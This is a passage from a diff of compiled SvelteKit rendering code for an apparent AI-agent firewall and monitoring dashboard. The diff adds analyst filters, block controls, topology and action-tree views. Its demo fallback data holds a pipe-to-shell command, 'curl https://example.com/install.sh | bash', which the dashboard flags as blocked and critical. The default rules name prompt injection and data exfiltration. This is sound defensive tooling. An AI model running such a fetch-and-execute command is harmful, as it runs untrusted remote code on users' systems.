@@ -1,5 +1,5 @@
 import "clsx";
-import { g as getContext, c as attr_class, b as bind_props, d as attr_style, e as ensure_array_like, f as stringify, h as store_get, u as unsubscribe_stores } from "../../../chunks/index2.js";
+import { g as getContext, a as attr_class, e as ensure_array_like, c as bind_props, d as attr_style, f as stringify, h as store_get, u as unsubscribe_stores } from "../../../chunks/index2.js";
 import { f as fallback, e as escape_html, a as attr } from "../../../chunks/attributes.js";
 import "@sveltejs/kit/internal";
 import "../../../chunks/exports.js";
@@ -31,11 +31,29 @@ const page = {
   }
 };
 function MapleTopBar($$renderer, $$props) {
-  let title = fallback($$props["title"], "Mayple");
-  let sourceText = fallback($$props["sourceText"], "Source: Frontend B orchestration runtime");
-  let connected = fallback($$props["connected"], false);
-  $$renderer.push(`<header${attr_class("top-bar", void 0, { "panel-connected": connected })}><div class="top-bar-brand"><span class="top-bar-title">${escape_html(title)}</span></div> <div class="top-bar-end"><span class="source-badge">${escape_html(sourceText)}</span> <button class="top-bar-icon-btn" type="button" aria-label="Refresh">↻</button></div></header>`);
-  bind_props($$props, { title, sourceText, connected });
+  $$renderer.component(($$renderer2) => {
+    let selectedCount;
+    let title = fallback($$props["title"], "Mayple");
+    let sourceText = fallback($$props["sourceText"], "Source: Frontend B orchestration runtime");
+    let connected = fallback($$props["connected"], false);
+    let analystOptions = fallback($$props["analystOptions"], () => [], true);
+    let selectedAnalysts = fallback($$props["selectedAnalysts"], () => [], true);
+    selectedCount = selectedAnalysts.length;
+    $$renderer2.push(`<header${attr_class("top-bar", void 0, { "panel-connected": connected })}><div class="top-bar-brand"><span class="top-bar-title">${escape_html(title)}</span></div> <div class="top-bar-end"><details class="analyst-filter"><summary class="analyst-filter-trigger">Analyst <span class="analyst-filter-count">${escape_html(selectedCount === 0 ? "Global" : `${selectedCount} selected`)}</span></summary> <div class="analyst-filter-menu"><button type="button" class="analyst-filter-clear">Global (all analysts)</button> <div class="analyst-filter-list"><!--[-->`);
+    const each_array = ensure_array_like(analystOptions);
+    for (let $$index = 0, $$length = each_array.length; $$index < $$length; $$index++) {
+      let analyst = each_array[$$index];
+      $$renderer2.push(`<label class="analyst-filter-item"><input type="checkbox"${attr("checked", selectedAnalysts.includes(analyst), true)}/> <span>${escape_html(analyst)}</span></label>`);
+    }
+    $$renderer2.push(`<!--]--></div></div></details> <span class="source-badge">${escape_html(sourceText)}</span> <button class="top-bar-icon-btn" type="button" aria-label="Refresh">↻</button></div></header>`);
+    bind_props($$props, {
+      title,
+      sourceText,
+      connected,
+      analystOptions,
+      selectedAnalysts
+    });
+  });
 }
 function MapleCategoryPills($$renderer, $$props) {
   $$renderer.component(($$renderer2) => {
@@ -104,6 +122,8 @@ function InterventionControlPanel($$renderer, $$props) {
     });
     let confirmStop = fallback($$props["confirmStop"], () => {
     });
+    let blockActionRule = fallback($$props["blockActionRule"], () => {
+    });
     let manualTarget = "";
     filteredExecutions = executions.filter((execution) => {
       const traceMatch = !traceQuery || String(execution.executionId ?? "").toLowerCase().includes(traceQuery.toLowerCase());
@@ -111,7 +131,7 @@ function InterventionControlPanel($$renderer, $$props) {
       return traceMatch && sessionMatch;
     });
     activeExecution = executions.find((entry) => entry.executionId === selectedExecutionId) ?? null;
-    if (!manualTarget && targetInput) manualTarget = targetInput;
+    if (targetInput && targetInput !== manualTarget) manualTarget = targetInput;
     targetValue = manualTarget || targetInput || activeExecution?.executionId || "";
     $$renderer2.push(`<section><h2>Audit &amp; Compliance Operations</h2> <p>Intervene directly on Frontend B executions with stop, replay, and escalation controls.</p> <div class="control-grid"><article class="panel"><div class="panel-head"><h3 class="panel-title">Traces + Sessions</h3> <span class="source-badge">${escape_html(filteredExecutions.length)}</span></div> <input class="input" placeholder="Search traces..." aria-label="Search traces"${attr("value", traceQuery)}/> <input class="input" placeholder="Search sessions..." aria-label="Search sessions"${attr("value", sessionQuery)}/> <div class="trace-list">`);
     if (filteredExecutions.length === 0) {
@@ -131,7 +151,7 @@ function InterventionControlPanel($$renderer, $$props) {
     if ($$body) {
       $$renderer2.push(`${$$body}`);
     }
-    $$renderer2.push(`</textarea></label> <div class="actions"><button type="button" class="action-btn"${attr("disabled", busy !== "" || !targetValue, true)}>Pause</button> <button type="button" class="action-btn"${attr("disabled", busy !== "" || !targetValue, true)}>Resume</button> <button type="button" class="action-btn danger"${attr("disabled", busy !== "" || !targetValue, true)}>Stop</button></div> `);
+    $$renderer2.push(`</textarea></label> <div class="actions"><button type="button" class="action-btn"${attr("disabled", busy !== "" || !targetValue, true)}>Pause</button> <button type="button" class="action-btn"${attr("disabled", busy !== "" || !targetValue, true)}>Resume</button> <button type="button" class="action-btn danger"${attr("disabled", busy !== "" || !targetValue, true)}>Stop</button> <button type="button" class="action-btn"${attr("disabled", busy !== "" || !targetValue, true)}>Block Future Action</button></div> `);
     if (showConfirmStop) {
       $$renderer2.push("<!--[0-->");
       $$renderer2.push(`<div class="panel"><p>Confirm destructive action</p> <div class="actions"><button type="button" class="action-btn primary"${attr("disabled", !reason.trim() || busy !== "", true)}>Confirm</button> <button type="button" class="action-btn"${attr("disabled", busy !== "", true)}>Cancel</button></div></div>`);
@@ -173,92 +193,42 @@ function InterventionControlPanel($$renderer, $$props) {
       resumeExecution,
       openStopConfirm,
       cancelStopConfirm,
-      confirmStop
+      confirmStop,
+      blockActionRule
     });
   });
 }
 function TopologyView($$renderer, $$props) {
   $$renderer.component(($$renderer2) => {
-    let topologyRows;
+    let leftNode, centerNode, rightNodes;
     let endpoints = fallback($$props["endpoints"], () => [], true);
-    const agents = [
+    let queueInterventionHandoff = fallback($$props["queueInterventionHandoff"], () => {
+    });
+    let topologyZoom = 1;
+    let topologyPanX = 0;
+    let topologyPanY = 0;
+    let topologyPanning = false;
+    const displayEndpoints = (Array.isArray(endpoints) ? endpoints : []).slice(0, 2);
+    leftNode = { title: "ClaudeBot", subtitle: "agent runtime" };
+    centerNode = { title: "Mayple", subtitle: "MCP server + firewall" };
+    rightNodes = displayEndpoints.length ? displayEndpoints.map((endpoint) => ({
+      title: endpoint.host,
+      subtitle: `policy: ${String(endpoint.status || "pending")}`,
+      sessionId: endpoint.sessionId || `session-topology-${endpoint.host}`
+    })) : [
       {
-        id: "planner",
-        label: "Planner Agent",
-        role: "Intent + policy planning"
+        title: "mcp.so",
+        subtitle: "policy: pending",
+        sessionId: "session-topology-1"
       },
       {
-        id: "runtime",
-        label: "Runtime Agent",
-        role: "Execution coordinator"
-      },
-      {
-        id: "guard",
-        label: "Guard Agent",
-        role: "Firewall + approval checks"
+        title: "docs.mcp.so",
+        subtitle: "policy: pending",
+        sessionId: "session-topology-2"
       }
     ];
-    let popup = { status: "observed" };
-    let modalTab = "guard";
-    let selectedAgent = "runtime";
-    topologyRows = endpoints.slice(0, 12).map((endpoint, index) => ({
-      id: `${endpoint.host}-${index}`,
-      source: index % 2 === 0 ? "Frontend B Runtime" : "Mayple Firewall",
-      target: endpoint.host,
-      decision: endpoint.status || "observed",
-      agent: agents[index % agents.length].label
-    }));
-    $$renderer2.push(`<section class="view-panel topology-view panel"><header class="mw-view-header"><h1>Topology</h1> <p>Inspect runtime trace topology, agent decision handoffs, and node-level intervention options.</p></header> <article class="panel topology-canvas-panel"><div class="panel-head"><h2 class="panel-title">Agentic Decision Topology</h2> <span class="chip">${escape_html(topologyRows.length)} edges</span></div> <p class="panel-sub">Live runtime handoffs from Frontend B orchestration traces.</p> <div class="topology-map"><div class="topology-agent-grid"><div class="topology-agent-column"><h3 class="topology-section-title">Agent Interaction Grid</h3> <div class="topology-agent-list"><!--[-->`);
-    const each_array = ensure_array_like(agents);
-    for (let $$index = 0, $$length = each_array.length; $$index < $$length; $$index++) {
-      let agent = each_array[$$index];
-      $$renderer2.push(`<button type="button"${attr_class("topology-agent-card", void 0, { "active": selectedAgent === agent.id })}><strong>${escape_html(agent.label)}</strong> <span>${escape_html(agent.role)}</span></button>`);
-    }
-    $$renderer2.push(`<!--]--></div></div> <div class="topology-flow-column"><h3 class="topology-section-title">Decision Handoffs</h3> <div class="topology-flow-list">`);
-    if (topologyRows.length === 0) {
-      $$renderer2.push("<!--[0-->");
-      $$renderer2.push(`<p class="empty-row">No topology data yet.</p>`);
-    } else {
-      $$renderer2.push("<!--[-1-->");
-    }
-    $$renderer2.push(`<!--]--> <!--[-->`);
-    const each_array_1 = ensure_array_like(topologyRows);
-    for (let $$index_1 = 0, $$length = each_array_1.length; $$index_1 < $$length; $$index_1++) {
-      let row = each_array_1[$$index_1];
-      $$renderer2.push(`<button type="button" class="topology-flow-row"><span class="mono">${escape_html(row.source)}</span> <span class="topology-arrow">→</span> <span class="mono">${escape_html(row.target)}</span> <span${attr_class(`topology-state-chip ${stringify(row.decision)}`)}>${escape_html(row.decision)}</span></button>`);
-    }
-    $$renderer2.push(`<!--]--></div></div> <div class="topology-endpoint-column"><h3 class="topology-section-title">Endpoints</h3> `);
-    if (endpoints.length === 0) {
-      $$renderer2.push("<!--[0-->");
-      $$renderer2.push(`<p class="empty-row">No endpoint traces available yet.</p>`);
-    } else {
-      $$renderer2.push("<!--[-1-->");
-    }
-    $$renderer2.push(`<!--]--> <!--[-->`);
-    const each_array_2 = ensure_array_like(endpoints);
-    for (let $$index_2 = 0, $$length = each_array_2.length; $$index_2 < $$length; $$index_2++) {
-      let endpoint = each_array_2[$$index_2];
-      $$renderer2.push(`<button type="button"${attr_class(`topology-node surface ${stringify(endpoint.status)}`)}><strong>${escape_html(endpoint.host)}</strong> <span>Status: ${escape_html(endpoint.status)}</span></button>`);
-    }
-    $$renderer2.push(`<!--]--></div></div></div> <div${attr_class("topology-endpoint-popup", void 0, { "hidden": true })}><div class="topology-endpoint-head"><h3>Endpoint Request</h3> <button type="button" class="topology-endpoint-close">Close</button></div> <p class="topology-endpoint-sub">Requested domain / IP</p> <div class="topology-endpoint-host mono">${escape_html("-")}</div> <div class="topology-endpoint-row"><span class="topology-endpoint-label">Current decision</span> <span${attr_class(`topology-endpoint-status ${stringify(popup.status)}`)}>${escape_html(popup.status)}</span></div> <div class="topology-endpoint-actions"><button type="button" class="topology-endpoint-approve">Open Node Actions</button></div></div></article> <div${attr_class("modal", void 0, { "hidden": true })}><button type="button" class="modal-backdrop" aria-label="Close node modal"></button> <div class="modal-card" role="dialog" aria-modal="true" aria-label="Node action modal"><div class="modal-head"><h2>Node Actions</h2> <button type="button" class="action-btn">Close</button></div> <p class="modal-sub">Endpoint: <code>${escape_html("-")}</code></p> <div class="modal-tabs"><button type="button"${attr_class("modal-tab", void 0, { "is-active": modalTab === "guard" })}>Guard</button> <button type="button"${attr_class("modal-tab", void 0, { "is-active": modalTab === "fork" })}>Fork</button> <button type="button"${attr_class("modal-tab", void 0, { "is-active": modalTab === "risk" })}>Risk</button> <button type="button"${attr_class("modal-tab", void 0, { "is-active": modalTab === "growth" })}>Growth</button></div> `);
-    {
-      $$renderer2.push("<!--[0-->");
-      $$renderer2.push(`<section class="modal-panel"><p>Set guard decision for this endpoint request.</p> <div class="actions"><button type="button" class="action-btn primary">Allow</button> <button type="button" class="action-btn danger">Block</button> <button type="button" class="action-btn">Pending</button></div> <input class="input" placeholder="Reason"/></section>`);
-    }
-    $$renderer2.push(`<!--]--> `);
-    {
-      $$renderer2.push("<!--[-1-->");
-    }
-    $$renderer2.push(`<!--]--> `);
-    {
-      $$renderer2.push("<!--[-1-->");
-    }
-    $$renderer2.push(`<!--]--> `);
-    {
-      $$renderer2.push("<!--[-1-->");
-    }
-    $$renderer2.push(`<!--]--></div></div></section>`);
-    bind_props($$props, { endpoints });
+    $$renderer2.push(`<section data-view-panel="topology" class="view-panel topology-view"><article class="panel topology-canvas-panel"><div class="tree-shell topology-tree-shell"><div${attr_class("topology-map", void 0, { "is-panning": topologyPanning })}><div class="canvas-zoom-controls" aria-label="Topology canvas zoom controls"><button type="button" class="zoom-btn">−</button> <button type="button" class="zoom-btn">Reset</button> <button type="button" class="zoom-btn">+</button></div> <div class="canvas-zoom-layer"${attr_style(`transform: translate(${topologyPanX}px, ${topologyPanY}px) scale(${topologyZoom});`)}><div class="topology-top-caption"><span class="topology-top-badge">Maple</span> <span class="topology-top-rules">RULES</span></div> <div class="topology-diagram"><div class="topology-box topology-box-left"><strong>${escape_html(leftNode.title)}</strong> <span>${escape_html(leftNode.subtitle)}</span></div> <div class="topology-box topology-box-center"><strong>${escape_html(centerNode.title)}</strong> <span>${escape_html(centerNode.subtitle)}</span></div> <button type="button" class="topology-box topology-box-right-top"><strong>${escape_html(rightNodes[0].title)}</strong> <span>${escape_html(rightNodes[0].subtitle)}</span></button> <button type="button" class="topology-box topology-box-right-bottom"><strong>${escape_html(rightNodes[1]?.title ?? rightNodes[0].title)}</strong> <span>${escape_html(rightNodes[1]?.subtitle ?? rightNodes[0].subtitle)}</span></button> <div class="topology-connector topology-connector-main"></div> <div class="topology-connector topology-connector-branch-a"></div> <div class="topology-connector topology-connector-branch-b"></div></div></div></div></div></article></section>`);
+    bind_props($$props, { endpoints, queueInterventionHandoff });
   });
 }
 function DocsViews($$renderer, $$props) {
@@ -268,7 +238,10 @@ function DocsViews($$renderer, $$props) {
     let endpoints = fallback($$props["endpoints"], () => [], true);
     let routeRecord = fallback($$props["routeRecord"], null);
     let runtimeCapabilities = fallback($$props["runtimeCapabilities"], () => [], true);
-    const LEGACY_DOC_LINKS = Object.entries(docsByPath).map(([path, doc]) => ({ label: doc?.title ?? path, href: path }));
+    const LEGACY_DOC_LINKS = Object.entries(docsByPath).map(([path, doc]) => ({
+      label: doc?.title ?? path,
+      href: path === "/" ? "/quickstart" : path
+    }));
     const INCIDENT_FLOW = [
       "Pause execution to stop blast radius",
       "Inspect trace + topology + approval queue",
@@ -343,7 +316,7 @@ function buildMonitoringQuickPrompts({ executionId = "", sessionId = "", routeTi
 }
 function WorkspaceViewHost($$renderer, $$props) {
   $$renderer.component(($$renderer2) => {
-    let activeExecution, activeExecutionId, activeSessionId, connectedProviders, catalogRows, appRows, toolRows, openclawRows, marketplaceRows, chatPrompts;
+    let activeExecution, activeExecutionId, activeSessionId, connectedProviders, catalogRows, appRows, toolRows, openclawRows, marketplaceRows, filteredMarketplaceRows, chatPrompts, liveNodes, isolatedForkRows, forkMainNodes, forkBranchNodes, seededUsers;
     let panelOpen = fallback($$props["panelOpen"], false);
     let state = $$props["state"];
     let routeRecord = fallback($$props["routeRecord"], null);
@@ -359,6 +332,7 @@ function WorkspaceViewHost($$renderer, $$props) {
     let downstreamApps = fallback($$props["downstreamApps"], () => [], true);
     let downstreamTools = fallback($$props["downstreamTools"], () => [], true);
     let openclawCatalog = fallback($$props["openclawCatalog"], () => [], true);
+    let firewallRules = fallback($$props["firewallRules"], () => [], true);
     let authMe = fallback($$props["authMe"], null);
     let selectedExecutionId = fallback($$props["selectedExecutionId"], "");
     let targetInput = fallback($$props["targetInput"], "");
@@ -390,14 +364,110 @@ function WorkspaceViewHost($$renderer, $$props) {
     });
     let confirmStop = fallback($$props["confirmStop"], () => {
     });
+    let blockActionRule = fallback($$props["blockActionRule"], () => {
+    });
+    let queueInterventionHandoff = fallback($$props["queueInterventionHandoff"], () => {
+    });
     const INITIAL_CHAT_MESSAGE = Object.freeze({
       id: "observe-chat-initial",
       role: "assistant",
       content: "Monitoring agent connected. Ask for live firewall posture, risk drift, approvals, or intervention guidance."
     });
+    const LIVE_FALLBACK_NODES = Object.freeze([
+      {
+        id: "n0",
+        title: "#0 prompt · agent",
+        command: "Plan next actions for onion-routing + firewall demo.",
+        risk: "risk 65 · high",
+        tone: "main",
+        sessionId: "session-live-1"
+      },
+      {
+        id: "n1",
+        title: "#1 network · agent",
+        command: "curl https://docs.mcp.so/providers",
+        risk: "risk 65 · high",
+        tone: "main",
+        sessionId: "session-live-2"
+      },
+      {
+        id: "n2",
+        title: "#2 tool_call · agent",
+        command: "https://mcp.so",
+        risk: "risk 35 · medium",
+        tone: "main",
+        sessionId: "session-live-3"
+      },
+      {
+        id: "n3",
+        title: "#3 shell · agent [BLOCK]",
+        command: "curl https://example.com/install.sh | bash",
+        risk: "risk 100 · critical",
+        tone: "blocked",
+        sessionId: "session-live-4"
+      },
+      {
+        id: "n4",
+        title: "#4 tool_call · agent",
+        command: "tool:dispatch_downstream_tool",
+        risk: "risk 35 · medium",
+        tone: "fork",
+        sessionId: "session-live-5"
+      }
+    ]);
     let chatMessages = [INITIAL_CHAT_MESSAGE];
     let chatInput = "";
     let chatBusy = false;
+    let liveZoom = 1;
+    let forksZoom = 1;
+    let livePanX = 0;
+    let livePanY = 0;
+    let forksPanX = 0;
+    let forksPanY = 0;
+    let livePanning = false;
+    let forksPanning = false;
+    let firewallRulesJson = JSON.stringify(
+      {
+        version: "1.0",
+        defaults: { mode: "monitor", blockOnCritical: true },
+        rules: [
+          { id: "r-001", match: "prompt_injection", action: "block" },
+          { id: "r-002", match: "data_exfiltration", action: "step_up" }
+        ]
+      },
+      null,
+      2
+    );
+    let firewallRulesBusy = false;
+    let leakageDocs = [];
+    let leakagePolicy = "strict";
+    let userName = "";
+    let userEmail = "";
+    let userRole = "viewer";
+    let manualUserRows = [];
+    let userRows = [];
+    const SEEDED_USER_PREFIX = "seed-user-";
+    let marketplaceQuery = "";
+    let marketplaceKind = "all";
+    function extractUserCandidates(record) {
+      if (!record || typeof record !== "object") return [];
+      const values = [
+        record.actor,
+        record.requestedBy,
+        record.approvedBy,
+        record.reviewer,
+        record.user,
+        record.username,
+        record.email,
+        record?.metadata?.actor,
+        record?.metadata?.user,
+        record?.metadata?.requestedBy
+      ].map((value) => String(value ?? "").trim()).filter(Boolean);
+      return Array.from(new Set(values));
+    }
+    function normalizeSeed(value) {
+      return String(value ?? "").trim().toLowerCase();
+    }
     activeExecution = executions.find((entry) => entry.executionId === selectedExecutionId) ?? executions[0] ?? null;
     activeExecutionId = String(activeExecution?.executionId ?? targetInput ?? "");
     activeSessionId = String(activeExecution?.sessionId ?? "");
@@ -435,14 +505,103 @@ function WorkspaceViewHost($$renderer, $$props) {
       detail: String(item.description ?? "")
     }));
     marketplaceRows = [...catalogRows, ...appRows, ...toolRows, ...openclawRows];
+    filteredMarketplaceRows = marketplaceRows.filter((row) => {
+      const query = marketplaceQuery.trim().toLowerCase();
+      const matchesQuery = !query || row.app.toLowerCase().includes(query) || row.detail.toLowerCase().includes(query) || row.source.toLowerCase().includes(query);
+      const matchesKind = marketplaceKind === "all";
+      return matchesQuery && matchesKind;
+    });
     chatPrompts = buildMonitoringQuickPrompts({
       executionId: activeExecutionId,
       sessionId: activeSessionId,
       routeTitle: routeRecord?.title ?? ""
     });
+    liveNodes = (() => {
+      const rows = auditEvents.slice(0, 5).map((event, index) => {
+        const rawStatus = String(event.guardDecision ?? event.status ?? event.severity ?? "observed").toLowerCase();
+        const tone = rawStatus.includes("block") || rawStatus.includes("fail") ? "blocked" : rawStatus.includes("warn") ? "fork" : "main";
+        const risk = String(event.riskLabel ?? event.risk ?? event.severity ?? "medium").toLowerCase();
+        const riskBand = risk.includes("critical") ? "critical" : risk.includes("high") ? "high" : "medium";
+        return {
+          id: event.id ?? `live-${index}`,
+          title: `#${index} ${event.eventType ?? event.type ?? "tool_call"} · ${event.actor ?? "agent"}`,
+          command: event.command ?? event.url ?? event.endpoint ?? event.traceId ?? event.executionId ?? "runtime action",
+          risk: `risk ${riskBand === "critical" ? "100" : riskBand === "high" ? "65" : "35"} · ${riskBand}`,
+          tone,
+          sessionId: String(event.sessionId ?? event.session ?? event.session_id ?? "").trim() || (event.executionId ? `session-for-${event.executionId}` : `session-live-${index + 1}`)
+        };
+      });
+      return rows.length > 0 ? rows : LIVE_FALLBACK_NODES;
+    })();
+    isolatedForkRows = auditEvents.filter((event) => {
+      const status = String(event.guardDecision ?? event.status ?? event.severity ?? "").toLowerCase();
+      const risk = String(event.riskLabel ?? event.risk ?? "").toLowerCase();
+      return status.includes("block") || status.includes("fail") || status.includes("warn") || risk.includes("high") || risk.includes("critical");
+    }).slice(0, 2).map((event, index) => ({
+      id: event.id ?? `fork-${index}`,
+      title: `Fork #${index + 2} ${event.eventType ?? event.type ?? "tool_call"} · ${event.actor ?? "agent"}`,
+      command: event.command ?? event.url ?? event.endpoint ?? 'echo "blocked untrusted remote script"; exit 1',
+      risk: `risk ${String(event.riskLabel ?? event.risk ?? "medium").toLowerCase().includes("high") ? "65" : "35"} · ${String(event.riskLabel ?? event.risk ?? "medium").toLowerCase().includes("high") ? "high" : "medium"}`,
+      sessionId: String(event.sessionId ?? event.session ?? event.session_id ?? "").trim() || (event.executionId ? `session-for-${event.executionId}` : `session-fork-${index + 1}`)
+    }));
+    forkMainNodes = liveNodes.slice(0, 4).map((node, index) => ({
+      ...node,
+      id: `main-${index}`,
+      tone: index === 2 ? "fork" : "main"
+    }));
+    forkBranchNodes = isolatedForkRows.length ? isolatedForkRows : [
+      {
+        id: "fork-2",
+        title: "Fork #2 tool_call · agent",
+        command: "echo 'blocked untrusted remote script'; exit 1",
+        risk: "risk 35 · medium",
+        sessionId: "session-fork-2"
+      },
+      {
+        id: "fork-3",
+        title: "Fork #3 system · system",
+        command: "Forked from step #2 via Mayple node modal.",
+        risk: "risk 35 · medium",
+        sessionId: "session-fork-3"
+      }
+    ];
+    seededUsers = (() => {
+      const names = Array.from(new Set([
+        ...auditEvents.flatMap((event) => extractUserCandidates(event)),
+        ...executions.flatMap((execution) => extractUserCandidates(execution)),
+        ...approvals.flatMap((approval) => extractUserCandidates(approval)),
+        authMe?.username,
+        authMe?.email
+      ].filter(Boolean)));
+      const rows = names.slice(0, 12).map((value, index) => {
+        const looksEmail = value.includes("@");
+        const normalized = normalizeSeed(value).replace(/[^a-z0-9]+/g, ".");
+        return {
+          id: `${SEEDED_USER_PREFIX}${index + 1}`,
+          name: looksEmail ? value.split("@")[0] : value,
+          email: looksEmail ? value : `${normalized || `analyst${index + 1}`}@mayple.dev`,
+          role: value === authMe?.email || value === authMe?.username ? "admin" : "operator"
+        };
+      });
+      return rows;
+    })();
+    userRows = [...seededUsers, ...manualUserRows];
     if (panelOpen && state.category === "observe" && state.view === "live") {
       $$renderer2.push("<!--[0-->");
-      $$renderer2.push(`<section class="view-panel live-view panel"><header class="mw-view-header"><h1>Observability &amp; Alerts</h1> <p>Monitor Frontend B orchestration runtime and intervene when risk escalates.</p></header> <p data-testid="monitoring-context-explainer">Monitoring context and live runtime posture.</p> <div class="card-grid"><article class="card"><h3>Summary</h3><pre>${escape_html(JSON.stringify(summary ?? {}, null, 2))}</pre></article> <article class="card"><h3>SLO</h3><pre>${escape_html(JSON.stringify(slo ?? {}, null, 2))}</pre></article></div></section>`);
+      $$renderer2.push(`<section class="view-panel live-view panel"><header class="mw-view-header"><h1>Observability &amp; Alerts</h1> <p>Monitor Frontend B orchestration runtime and intervene when risk escalates.</p></header> <article class="panel tree-panel"><div class="tree-shell"><div class="tree-legend"><span><i class="legend-dot legend-main"></i> Main</span> <span><i class="legend-dot legend-fork"></i> Fork</span> <span><i class="legend-dot legend-block"></i> Blocked</span></div> <div class="action-tree-wrap"><div${attr_class("action-tree-canvas", void 0, { "is-panning": livePanning })}><div class="canvas-zoom-controls" aria-label="Live canvas zoom controls"><button type="button" class="zoom-btn">−</button> <button type="button" class="zoom-btn">Reset</button> <button type="button" class="zoom-btn">+</button></div> <div class="canvas-zoom-layer"${attr_style(`transform: translate(${livePanX}px, ${livePanY}px) scale(${liveZoom});`)}><div class="monitor-step-stack"><!--[-->`);
+      const each_array = ensure_array_like(liveNodes);
+      for (let index = 0, $$length = each_array.length; index < $$length; index++) {
+        let node = each_array[index];
+        $$renderer2.push(`<button type="button"${attr_class(`monitor-step-node monitor-step-${stringify(node.tone)}`)}${attr_style(`animation-delay:${index * 80}ms;`)}><strong>${escape_html(node.title)}</strong> <span>${escape_html(node.command)}</span> <em>${escape_html(node.risk)}</em></button> `);
+        if (index < liveNodes.length - 1) {
+          $$renderer2.push("<!--[0-->");
+          $$renderer2.push(`<div class="monitor-step-arrow">↓</div>`);
+        } else {
+          $$renderer2.push("<!--[-1-->");
+        }
+        $$renderer2.push(`<!--]-->`);
+      }
+      $$renderer2.push(`<!--]--></div></div></div></div></div></article> <p data-testid="monitoring-context-explainer" class="empty-row">Monitoring context and live runtime posture.</p></section>`);
     } else {
       $$renderer2.push("<!--[-1-->");
     }
@@ -450,15 +609,15 @@ function WorkspaceViewHost($$renderer, $$props) {
     if (panelOpen && state.category === "chat" && state.view === "chat") {
       $$renderer2.push("<!--[0-->");
       $$renderer2.push(`<section data-view-panel="chat" class="view-panel chat-view panel"><header class="mw-view-header"><h1>Monitoring Chat</h1> <p>Chat with the monitoring agent for live firewall updates and intervention recommendations.</p></header> <article class="panel"><div class="panel-head"><h2 class="panel-title">Monitoring Agent</h2> <span class="chip">${escape_html(activeExecutionId ? `execution=${activeExecutionId}` : activeSessionId ? `session=${activeSessionId}` : "target=unselected")}</span></div> <div class="mw-chat-prompts"><!--[-->`);
-      const each_array = ensure_array_like(chatPrompts);
-      for (let $$index = 0, $$length = each_array.length; $$index < $$length; $$index++) {
-        let prompt = each_array[$$index];
+      const each_array_1 = ensure_array_like(chatPrompts);
+      for (let $$index_1 = 0, $$length = each_array_1.length; $$index_1 < $$length; $$index_1++) {
+        let prompt = each_array_1[$$index_1];
         $$renderer2.push(`<button type="button" class="mw-chat-prompt"${attr("disabled", chatBusy, true)}>${escape_html(prompt)}</button>`);
       }
       $$renderer2.push(`<!--]--></div> <div class="mw-chat-log" role="log" aria-live="polite"><!--[-->`);
-      const each_array_1 = ensure_array_like(chatMessages);
-      for (let $$index_1 = 0, $$length = each_array_1.length; $$index_1 < $$length; $$index_1++) {
-        let message = each_array_1[$$index_1];
+      const each_array_2 = ensure_array_like(chatMessages);
+      for (let $$index_2 = 0, $$length = each_array_2.length; $$index_2 < $$length; $$index_2++) {
+        let message = each_array_2[$$index_2];
         $$renderer2.push(`<article${attr_class(`mw-chat-bubble ${stringify(message.role === "user" ? "mw-chat-bubble-user" : "mw-chat-bubble-assistant")}`)}><p>${escape_html(message.content)}</p></article>`);
       }
       $$renderer2.push(`<!--]--></div> <form class="mw-chat-form"><input type="text"${attr("value", chatInput)} placeholder="Ask for monitoring updates, risk drift, or next intervention..." autocomplete="off"/> <button type="submit"${attr("disabled", !chatInput.trim(), true)}>${escape_html("Send")}</button></form> `);
@@ -472,25 +631,26 @@ function WorkspaceViewHost($$renderer, $$props) {
     $$renderer2.push(`<!--]--> `);
     if (panelOpen && state.category === "observe" && state.view === "timeline") {
       $$renderer2.push("<!--[0-->");
-      $$renderer2.push(`<section data-view-panel="timeline" class="view-panel timeline-view panel"><header class="mw-view-header"><h1>Timeline</h1> <p>Ordered Frontend B runtime events for incident triage and intervention sequencing.</p></header> <article class="panel"><div class="panel-head"><h2 class="panel-title">Runtime Event Stream</h2> <span class="chip">${escape_html(auditEvents.length)}</span></div> `);
+      $$renderer2.push(`<section data-view-panel="timeline" class="view-panel timeline-view panel"><article class="panel timeline-panel"><h2 class="panel-title">Incident Timeline</h2> <p class="panel-sub">Auto-refreshing incident feed from live trace APIs.</p> <div class="timeline-table-wrap"><table class="timeline-table" id="timelineBody"><thead><tr><th>Index</th><th>Actor</th><th>Type</th><th>Command / URL</th><th>Risk</th><th>Guard</th></tr></thead><tbody>`);
       if (auditEvents.length === 0) {
         $$renderer2.push("<!--[0-->");
-        $$renderer2.push(`<p class="empty-row">No B-origin events available.</p>`);
+        $$renderer2.push(`<tr><td colspan="6" class="empty-row">No trace loaded.</td></tr>`);
       } else {
         $$renderer2.push("<!--[-1-->");
-      }
-      $$renderer2.push(`<!--]--> <div class="timeline-table-wrap"><table class="timeline-table" id="timelineBody"><thead><tr><th>Event</th><th>Execution</th><th>Timestamp</th><th>Source</th></tr></thead><tbody><!--[-->`);
-      const each_array_2 = ensure_array_like(auditEvents);
-      for (let $$index_2 = 0, $$length = each_array_2.length; $$index_2 < $$length; $$index_2++) {
-        let event = each_array_2[$$index_2];
-        $$renderer2.push(`<tr><td>${escape_html(event.eventType ?? event.type ?? event.action ?? "event")}</td><td class="mono">${escape_html(event.executionId ?? event.traceId ?? "-")}</td><td>${escape_html(event.timestamp ?? event.createdAt ?? "-")}</td><td>${escape_html(event.source ?? event.origin ?? "runtime")}</td></tr>`);
+        $$renderer2.push(`<!--[-->`);
+        const each_array_3 = ensure_array_like(auditEvents);
+        for (let index = 0, $$length = each_array_3.length; index < $$length; index++) {
+          let event = each_array_3[index];
+          $$renderer2.push(`<tr><td>${escape_html(index + 1)}</td><td>${escape_html(event.actor ?? event.source ?? event.origin ?? "runtime")}</td><td>${escape_html(event.eventType ?? event.type ?? event.action ?? "event")}</td><td class="mono">${escape_html(event.command ?? event.url ?? event.endpoint ?? event.executionId ?? event.traceId ?? "-")}</td><td>${escape_html(event.riskLabel ?? event.severity ?? "low")}</td><td>${escape_html(event.guardDecision ?? event.status ?? "observed")}</td></tr>`);
+        }
+        $$renderer2.push(`<!--]-->`);
       }
       $$renderer2.push(`<!--]--></tbody></table></div></article></section>`);
     } else {
       $$renderer2.push("<!--[-1-->");
     }
     $$renderer2.push(`<!--]--> `);
-    if (panelOpen && state.category === "analyze" && state.view === "control") {
+    if (panelOpen && state.category === "admin" && state.view === "control") {
       $$renderer2.push("<!--[0-->");
       InterventionControlPanel($$renderer2, {
         executions,
@@ -512,84 +672,213 @@ function WorkspaceViewHost($$renderer, $$props) {
         resumeExecution,
         openStopConfirm,
         cancelStopConfirm,
-        confirmStop
+        confirmStop,
+        blockActionRule
       });
     } else {
       $$renderer2.push("<!--[-1-->");
     }
     $$renderer2.push(`<!--]--> `);
-    if (panelOpen && state.category === "analyze" && state.view === "topology") {
